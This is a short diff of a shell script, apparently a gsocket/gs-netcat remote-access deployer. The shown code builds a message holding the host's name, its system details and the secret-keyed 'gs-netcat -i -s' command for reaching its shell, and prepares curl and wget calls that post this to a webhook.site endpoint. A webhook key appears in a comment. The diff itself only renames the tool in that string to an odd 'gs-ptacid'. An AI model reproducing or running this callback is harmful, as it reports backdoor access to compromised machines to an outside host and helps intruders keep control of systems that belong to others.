@@ -104,7 +104,7 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 # GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
 [[ -n $GS_WEBHOOK_KEY ]] && {
 	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
+	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-ptacid -i -s ${GS_SECRET}"}'
 	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 }
